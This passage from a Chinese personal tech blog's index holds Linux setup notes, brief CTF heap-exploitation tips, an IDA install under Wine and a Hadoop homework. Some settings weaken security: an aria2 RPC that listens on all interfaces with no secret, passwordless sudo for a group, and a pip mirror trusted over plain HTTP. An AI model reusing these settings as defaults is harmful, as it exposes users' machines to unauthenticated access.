href="#处理方案" class="headerlink" title="处理方案"></a>处理方案</h3><p>直接移动后会报错，然后根据报错位置找到了<br><strong>/usr/lib/python3/dist-packages/torbrowser_launcher/</strong><br>这里有一堆py文件，然后经过手动探寻可以查到common.py里存放了位置信息，所以我将common.py里的 <strong>tbb_local = ‘{0}/.local/share/torbrowser/‘.format(homedir)</strong> 改成 <strong>tbb_local = ‘{0}/.local/share/torbrowser/test/‘.format(homedir)</strong><br>加多一层目录，然后命令行就可以完美启动了！</p><h2 id="出现软件无法启动问题"><a href="#出现软件无法启动问题" class="headerlink" title="出现软件无法启动问题"></a>出现软件无法启动问题</h2><p>删除沙盒里的配置文件就行，或者注释掉部分<br>/etc/firejail 存着对应软件的沙盒配置文件</p><h2 id="v2ray问题"><a href="#v2ray问题" class="headerlink" title="v2ray问题"></a>v2ray问题</h2><p>v2ray连不上有两个原因，<br>1.时间<br>2.配置文件，因为配置文件差了个流量控制的邮箱</p><p>时间问题可以安装ntpdate<br>sudo apt-get install ntpdate<br>sudo ntpdate 0.asia.pool.ntp.org</p><p>vi /etc/crontab<br>在末尾增加* */1 * * * ntpdate 0.asia.pool.ntp.org</p><p>同步到硬件<br>hwclock –systohc</p><h2 id="vmware问题"><a href="#vmware问题" class="headerlink" title="vmware问题"></a>vmware问题</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">VMWARE_VERSION=workstation-12.5.9</span><br><span class="line">TMP_FOLDER=/tmp/patch-vmware</span><br><span class="line">rm -fdr <span class="variable">$TMP_FOLDER</span></span><br><span class="line">mkdir -p <span class="variable">$TMP_FOLDER</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$TMP_FOLDER</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mkubecek/vmware-host-modules.git</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$TMP_FOLDER</span>/vmware-host-modules</span><br><span class="line">git checkout <span class="variable">$VMWARE_VERSION</span></span><br><span class="line">git fetch</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo rm /usr/lib/vmware/lib/libz.so.1/libz.so.1</span><br><span class="line">sudo ln -s /lib/x86_64-linux-gnu/libz.so.1 /usr/lib/vmware/lib/libz.so.1/libz.so.1</span><br><span class="line">sudo /etc/init.d/vmware restart</span><br></pre></td></tr></table></figure><h2 id="vimplus"><a href="#vimplus" class="headerlink" title="vimplus"></a>vimplus</h2><p>apt install vim-python-jedi<br>开机自启脚本</p><h2 id="双系统引导找回问题"><a href="#双系统引导找回问题" class="headerlink" title="双系统引导找回问题"></a>双系统引导找回问题</h2><p>进行live模式<br>先查看哪个是linux启动盘</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p>然后挂载</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sda2 /mnt</span><br><span class="line">mount --<span class="built_in">bind</span> /proc /mnt/proc</span><br><span class="line">mount --<span class="built_in">bind</span> /dev /mnt/dev</span><br><span class="line">mount --<span class="built_in">bind</span> /sys /mnt/sys</span><br><span class="line">chroot /mnt</span><br><span class="line">apt-get install grub-pc <span class="comment">#可有可无</span></span><br><span class="line">grub-mkconfig <span class="comment">#可有可无</span></span><br><span class="line">update-grub</span><br><span class="line">grub-install /dev/sda <span class="comment">#可有可无</span></span><br></pre></td></tr></table></figure><h2 id="aria2"><a href="#aria2" class="headerlink" title="aria2"></a>aria2</h2><p>sudo apt-get install aria2</p><p>/etc/aria2/aria2.conf</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用户名</span></span><br><span class="line"><span class="comment">#rpc-user=user</span></span><br><span class="line"><span class="comment">#密码</span></span><br><span class="line"><span class="comment">#rpc-passwd=passwd</span></span><br><span class="line"><span class="comment">#上面的认证方式不建议使用,建议使用下面的token方式</span></span><br><span class="line"><span class="comment">#设置加密的密钥</span></span><br><span class="line"><span class="comment">#rpc-secret=token</span></span><br><span class="line"><span class="comment">#允许rpc</span></span><br><span class="line"><span class="built_in">enable</span>-rpc=<span class="literal">true</span></span><br><span class="line"><span class="comment">#允许所有来源, web界面跨域权限需要</span></span><br><span class="line">rpc-allow-origin-all=<span class="literal">true</span></span><br><span class="line"><span class="comment">#允许外部访问，false的话只监听本地端口</span></span><br><span class="line">rpc-listen-all=<span class="literal">true</span></span><br><span class="line"><span class="comment">#RPC端口, 仅当默认端口被占用时修改</span></span><br><span class="line"><span class="comment">#rpc-listen-port=6800</span></span><br><span class="line"><span class="comment">#最大同时下载数(任务数), 路由建议值: 3</span></span><br><span class="line">max-concurrent-downloads=5</span><br><span class="line"><span class="comment">#断点续传</span></span><br><span class="line"><span class="built_in">continue</span>=<span class="literal">true</span></span><br><span class="line"><span class="comment">#同服务器连接数</span></span><br><span class="line">max-connection-per-server=5</span><br><span class="line"><span class="comment">#最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要</span></span><br><span class="line">min-split-size=10M</span><br><span class="line"><span class="comment">#单文件最大线程数, 路由建议值: 5</span></span><br><span class="line">split=10</span><br><span class="line"><span class="comment">#下载速度限制</span></span><br><span class="line">max-overall-download-limit=0</span><br><span class="line"><span class="comment">#单文件速度限制</span></span><br><span class="line">max-download-limit=0</span><br><span class="line"><span class="comment">#上传速度限制</span></span><br><span class="line">max-overall-upload-limit=0</span><br><span class="line"><span class="comment">#单文件速度限制</span></span><br><span class="line">max-upload-limit=0</span><br><span class="line"><span class="comment">#断开速度过慢的连接</span></span><br><span class="line"><span class="comment">#lowest-speed-limit=0</span></span><br><span class="line"><span class="comment">#验证用，需要1.16.1之后的release版本</span></span><br><span class="line"><span class="comment">#referer=*</span></span><br><span class="line"><span class="comment">#文件保存路径, 默认为当前启动位置</span></span><br><span class="line">dir=/Users/&lt;user_name&gt;/Downloads</span><br><span class="line"><span class="comment">#文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本</span></span><br><span class="line"><span class="comment">#disk-cache=0</span></span><br><span class="line"><span class="comment">#另一种Linux文件缓存方式, 使用前确保您使用的内核支持此选项, 需要1.15及以上版本(?)</span></span><br><span class="line"><span class="comment">#enable-mmap=true</span></span><br><span class="line"><span class="comment">#文件预分配, 能有效降低文件碎片, 提高磁盘性能. 缺点是预分配时间较长</span></span><br><span class="line"><span class="comment">#所需时间 none &lt; falloc ? trunc « prealloc, falloc和trunc需要文件系统和内核支持</span></span><br><span class="line">file-allocation=prealloc</span><br></pre></td></tr></table></figure><p>/etc/init.d/aria2c</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides: aria2</span></span><br><span class="line"><span class="comment"># Required-Start: $remote_fs $network</span></span><br><span class="line"><span class="comment"># Required-Stop: $remote_fs $network</span></span><br><span class="line"><span class="comment"># Default-Start: 2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop: 0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: Aria2 Downloader</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></span><br><span class="line">start)</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> -n <span class="string">"已开启Aria2c"</span></span><br><span class="line"> sudo aria2c --conf-path=/etc/aria2/aria2.conf -D</span><br><span class="line">;;</span><br><span class="line">stop)</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> -n <span class="string">"已关闭Aria2c"</span></span><br><span class="line"> killall aria2c</span><br><span class="line">;;</span><br><span class="line">restart)</span><br><span class="line"> </span><br><span class="line"> killall aria2c</span><br><span class="line"> sudo aria2c --conf-path=/etc/aria2/aria2.conf -D</span><br><span class="line">;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>谷歌插件</p><h2 id="sudo-设置不用密码"><a href="#sudo-设置不用密码" class="headerlink" title="sudo 设置不用密码"></a>sudo 设置不用密码</h2><p>%NoOne-hub ALL=(ALL) NOPASSWD: NOPASSWD:ALL</p><h2 id="阿里云docker加速镜像"><a href="#阿里云docker加速镜像" class="headerlink" title="阿里云docker加速镜像"></a>阿里云docker加速镜像</h2><p>vi /etc/docker/daemon.json</p><p>{</p><p>“registry-mirrors”: [“<span class="exturl" data-url="aHR0cDovL2h1Yi1taXJyb3IuYy4xNjMuY29tJnF1b3Q7XQ==" title="http://hub-mirror.c.163.com&quot;]">http://hub-mirror.c.163.com&quot;]<i class="fa fa-external-link"></i></span></p><p>}</p><p><span class="exturl" data-url="aHR0cHM6Ly9jci5jb25zb2xlLmFsaXl1bi5jb20vY24taGFuZ3pob3UvaW5zdGFuY2VzL21pcnJvcnM=" title="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors<i class="fa fa-external-link"></i></span></p><h2 id="pip-换源"><a href="#pip-换源" class="headerlink" title="pip 换源"></a>pip 换源</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir ~/.pip</span><br><span class="line">cat &gt;&gt; ~/.pip/pip.conf &lt;&lt; EOF</span><br><span class="line">[global]</span><br><span class="line">index-url =  http://mirrors.aliyun.com/pypi/simple/ </span><br><span class="line">trusted-host = mirrors.aliyun.com</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h2 id="禁用虚拟网卡"><a href="#禁用虚拟网卡" class="headerlink" title="禁用虚拟网卡"></a>禁用虚拟网卡</h2><p>内网段冲突</p><p>ifconfig b47cab9fe564 down</p><h2 id="docker-存在依赖无法删除"><a href="#docker-存在依赖无法删除" class="headerlink" title="docker 存在依赖无法删除"></a>docker 存在依赖无法删除</h2><p>docker commit 容器id 名称<br>docker save -o 压缩包.tar 新镜像名称:latest</p><p>删除所有关于这个的镜像以及容易<br>docker load -i ./压缩包.tar</p><h2 id="wine依赖问题"><a href="#wine依赖问题" class="headerlink" title="wine依赖问题"></a>wine依赖问题</h2><p>删除winehq-stable的官方源，用parrot的源安装就可以了</p><h2 id="parrot-关闭更新提示"><a href="#parrot-关闭更新提示" class="headerlink" title="parrot 关闭更新提示"></a>parrot 关闭更新提示</h2><p>修改配置文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/xdg/autostart/parrot-updater.desktop</span><br></pre></td></tr></table></figure><p>文件内容如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env xdg-open</span></span><br><span class="line">[Desktop Entry]</span><br><span class="line">Name=System Updater</span><br><span class="line">Comment=Update reminder <span class="keyword">for</span> Parrot OS</span><br><span class="line">Icon=synaptic</span><br><span class="line">Exec=/usr/bin/update-reminder scheduled</span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=</span><br><span class="line">X-MATE-Autostart-enabled=<span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="配置文件导入导出"><a href="#配置文件导入导出" class="headerlink" title="配置文件导入导出"></a>配置文件导入导出</h2><p>dconf dump / &gt; dconf-settings.ini<br>dconf load / &lt; dconf-settings.ini</p><h2 id="耳机没声音，外放有声音"><a href="#耳机没声音，外放有声音" class="headerlink" title="耳机没声音，外放有声音"></a>耳机没声音，外放有声音</h2><p>重置下bios就行了</p><h2 id="c-编译32位"><a href="#c-编译32位" class="headerlink" title="c++ 编译32位"></a>c++ 编译32位</h2><p>g++-mulpilib</p><h2 id="gcc-编译静态链接"><a href="#gcc-编译静态链接" class="headerlink" title="gcc 编译静态链接"></a>gcc 编译静态链接</h2><p>gcc -static</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/ea44abbe/">https://noone-hub.github.io/posts/ea44abbe/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>比赛细节注意点</title>
    <url>/posts/c85295da/</url>
    <content><![CDATA[<h1 id="pwn-细节"><a href="#pwn-细节" class="headerlink" title="pwn_细节"></a>pwn_细节</h1><h2 id="partial-write"><a href="#partial-write" class="headerlink" title="partial write"></a>partial write</h2><p>保护全开情况下考虑部分覆盖，不要全部覆盖，开了pie后三位是固定的</p><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>巧妙利用unsortbin可以在<strong>malloc_hook或者</strong>free_hook前伪造一个地址，造成错位攻击</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/c85295da/">https://noone-hub.github.io/posts/c85295da/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>细节</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>ida7.2的安装</title>
    <url>/posts/475ebacd/</url>
    <content><![CDATA[<h1 id="论如何在linux上安装ida7-2以及安装插件"><a href="#论如何在linux上安装ida7-2以及安装插件" class="headerlink" title="论如何在linux上安装ida7.2以及安装插件"></a>论如何在linux上安装ida7.2以及安装插件</h1><p>序言：原来用ida pro7.0用了好久，听说ida新出了挺多新功能，又折腾了一天？太菜了，我只是想试试新功能而已，ida pro 7.2已经有插件可以同步反汇编程序和反编译程序视图，还有折腾了以前没折腾成的插件。其实最想的还是ida pro7.3,听说可以撤销。<br>我没找到ida pro7.2 linux版本，所以便用win下的替代了。linux下跑windows的软件，在我看来，首选就是wine了</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>这篇算是对我的那个环境配置的补充吧<br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNTc0OQ==" title="https://xz.aliyun.com/t/5749">环境配置篇<i class="fa fa-external-link"></i></span></p><h2 id="安装wine"><a href="#安装wine" class="headerlink" title="安装wine"></a>安装wine</h2><p>这里建议呢，安装winehq-stable版本<br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLndpbmVocS5vcmcvRG93bmxvYWQ=" title="https://wiki.winehq.org/Download">官网下载地址<i class="fa fa-external-link"></i></span></p><p>官网选后会有文档指示如何安装，这里我用的是debian发行版，所以我按我的来</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">wget -nc https://dl.winehq.org/wine-builds/winehq.key</span><br><span class="line">sudo apt-key add winehq.key</span><br></pre></td></tr></table></figure><p>然后添加源，这里位置不尽相同,自行添加了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb https://dl.winehq.org/wine-builds/debian/ buster main</span><br></pre></td></tr></table></figure><p>更新源</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install --install-recommends winehq-stable</span><br></pre></td></tr></table></figure><h2 id="下载ida-pro-7-2安装包"><a href="#下载ida-pro-7-2安装包" class="headerlink" title="下载ida pro 7.2安装包"></a>下载ida pro 7.2安装包</h2><p>这里相信各路神仙会有自己的办法的</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里假设安装包为ida.exe</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wine64 ida.exe</span><br></pre></td></tr></table></figure><p>然后windows的安装操作各位会吧，一路next也可以，安装完会提示安装python，也安装<br>然后转到.wine目录下的ida目录下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.wine/drive_c/<span class="string">'Program Files'</span>/</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>ls结果如下<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6go7eabbkj30f301gq2z.jpg" alt="20190829172100.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">'IDA 7.2'</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wine64 ida</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wine64 ida64</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gobufrcmj30nj0h0abu.jpg" alt="20190829172516.png"><br>就运行成功了，到这里其实ida安装算完成了，可还要折腾插件啊，还有一些东西要折腾的可以参照<br><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNTIyMDguaHRt" title="https://bbs.pediy.com/thread-252208.htm">看雪大佬的文章<i class="fa fa-external-link"></i></span><br>就是做些替换工作</p><p>对我来说方便的插件</p><ol><li>lazyida</li><li>findcrypt</li><li>HrDevHelper</li><li>IDASkins</li><li>hexlight<br>具体介绍可以从这里看到<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL29uZXRoYXd0L2lkYXBsdWdpbnMtbGlzdA==" title="https://github.com/onethawt/idaplugins-list">idaplugins-list<i class="fa fa-external-link"></i></span></li></ol><p>这里比较难装的就是findcrypt了，最主要他要自己装个python库，我原来的思路是从虚拟机共享文件夹，然后设置环境变量来pip install yara<br>现在我发觉更简单的方法了,先按照原来的方法到</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wine64 easy_install-2.7.exe  yara</span><br><span class="line"><span class="built_in">cd</span> ~/.wine/drive_c/Python27/Scripts</span><br><span class="line">wine64 easy_install-2.7.exe  yara</span><br></pre></td></tr></table></figure><p>这样便安装成了</p><p>然后插件全放到ida7.2目录下的plugins里就成了<br>最终分享下界面</p><h2 id="界面share"><a href="#界面share" class="headerlink" title="界面share"></a>界面share</h2><ol><li><p>idaskin加hexlight高亮<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gotziju8j30rb0ipju8.jpg" alt="20190829174242.png"></p></li><li><p>HrDevHelper的树型图<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6govgs0voj317o0lsn1d.jpg" alt="20190829174408.png"></p></li><li><p>lazyida dump数据<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gox6396wj30fe02swef.jpg" alt="20190829174546.png"></p></li><li><p>至于findcrypt和lazyida的查找格式化字符串漏洞的就不截图了</p></li><li><p>dysnc我截图不了就算了，手机拍糊了点<br>最主要是要有一个好看的皮囊啊，我感觉这样配置下来比原来的好看多了</p></li></ol><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/475ebacd/">https://noone-hub.github.io/posts/475ebacd/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>环境</category>
      </categories>
      <tags>
        <tag>二进制，ida</tag>
      </tags>
  </entry>
  <entry>
    <title>大数据作业</title>
    <url>/posts/c690256a/</url>
    <content><![CDATA[<h1 id="hadoop1"><a href="#hadoop1" class="headerlink" title="hadoop1"></a>hadoop1</h1><p>建议执行前先打快照，我原来就是不知道怎么折腾把环境搞崩了，然后又折腾花了好久</p><p>java代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.StringTokenizer;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.util.GenericOptionsParser;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCount</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WordCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line">        String[] otherArgs = (<span class="keyword">new</span> GenericOptionsParser(conf, args)).getRemainingArgs();</span><br><span class="line">        <span class="keyword">if</span>(otherArgs.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            System.err.println(<span class="string">"Usage: wordcount &lt;in&gt; [&lt;in&gt;...] &lt;out&gt;"</span>);</span><br><span class="line">            System.exit(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Job job = Job.getInstance(conf, <span class="string">"word count"</span>);</span><br><span class="line">        job.setJarByClass(WordCount.class);</span><br><span class="line">        job.setMapperClass(WordCount.TokenizerMapper.class);</span><br><span class="line">        job.setCombinerClass(WordCount.IntSumReducer.class);</span><br><span class="line">        job.setReducerClass(WordCount.IntSumReducer.class);</span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(IntWritable.class); </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; otherArgs.length - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">            FileInputFormat.addInputPath(job, <span class="keyword">new</span> Path(otherArgs[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> Path(otherArgs[otherArgs.length - <span class="number">1</span>]));</span><br><span class="line">        System.exit(job.waitForCompletion(<span class="keyword">true</span>)?<span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TokenizerMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">Object</span>, <span class="title">Text</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> IntWritable one = <span class="keyword">new</span> IntWritable(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">private</span> Text word = <span class="keyword">new</span> Text();</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TokenizerMapper</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">map</span><span class="params">(Object key, Text value, Mapper&lt;Object, Text, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">            StringTokenizer itr = <span class="keyword">new</span> StringTokenizer(value.toString()); </span><br><span class="line">            <span class="keyword">while</span>(itr.hasMoreTokens()) &#123;</span><br><span class="line">                <span class="keyword">this</span>.word.set(itr.nextToken());</span><br><span class="line">                context.write(<span class="keyword">this</span>.word, one);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">IntSumReducer</span> <span class="keyword">extends</span> <span class="title">Reducer</span>&lt;<span class="title">Text</span>, <span class="title">IntWritable</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> IntWritable result = <span class="keyword">new</span> IntWritable();</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">IntSumReducer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Reducer&lt;Text, IntWritable, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            IntWritable val;</span><br><span class="line">            <span class="keyword">for</span>(Iterator i$ = values.iterator(); i$.hasNext(); sum += val.get()) &#123;</span><br><span class="line">                val = (IntWritable)i$.next();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.result.set(sum);</span><br><span class="line">            context.write(key, <span class="keyword">this</span>.result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>选择File-&gt;Export-&gt;一系列next，最后要选择Main_Class</p><p><img src="https://i.loli.net/2019/11/11/Eq6wkSRNZvcbs5A.png" alt="20191025211017021_1663740123"><br>导出jar后，scp传上去</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp wordCounter.jar hadoop@192.168.150.133:/usr/<span class="built_in">local</span>/hadoop</span><br></pre></td></tr></table></figure><p>启动hadoop</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./sbin/start-all.sh</span><br></pre></td></tr></table></figure><p>创建文件夹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/hdfs dfs -mkdir /<span class="built_in">test</span>/input</span><br><span class="line">./bin/hdfs dfs -mkdir /<span class="built_in">test</span>/output</span><br></pre></td></tr></table></figure><p>移动文件到目录下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/hdfs dfs -mv 你的单词文件 /<span class="built_in">test</span>/input</span><br></pre></td></tr></table></figure><p>可以看到目录下有wordCounter.jar</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hadoop@dblab-VirtualBox:/usr/<span class="built_in">local</span>/hadoop$ ls</span><br><span class="line">bin  etc  include  lib  libexec  LICENSE.txt  logs  NOTICE.txt  README.txt  sbin  share  tmp  wordCounter.jar  word.txt</span><br></pre></td></tr></table></figure><p>执行hadoop</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/hadoop jar wordCounter.jar <span class="string">'/test/input'</span> <span class="string">'/test/ouput'</span></span><br></pre></td></tr></table></figure><p>查看结果</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/hdfs dfs -cat /<span class="built_in">test</span>/ouput/part-r-00000</span><br><span class="line">game	1</span><br><span class="line">hadoop	2</span><br><span class="line">i	5</span><br><span class="line">love	5</span><br><span class="line">mapreduce	2</span><br><span class="line">this	1</span><br></pre></td></tr></table></figure><h1 id="自行配置eclipse自动补全"><a href="#自行配置eclipse自动补全" class="headerlink" title="自行配置eclipse自动补全"></a>自行配置eclipse自动补全</h1><p><img src="https://i.loli.net/2019/11/11/LqOUjGFK8nheYcD.png" alt="20191025214212938_984636996"></p><p>配置自动补全</p><p>.abcdefghijklmnopqrstuvwxyz(,</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/c690256a/">https://noone-hub.github.io/posts/c690256a/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>作业</category>
      </categories>
      <tags>
        <tag>大数据，作业</tag>
      </tags>
  </entry>
  <entry>
    <title>书籍文章目录</title>
    <url>/posts/18d025c7/</url>
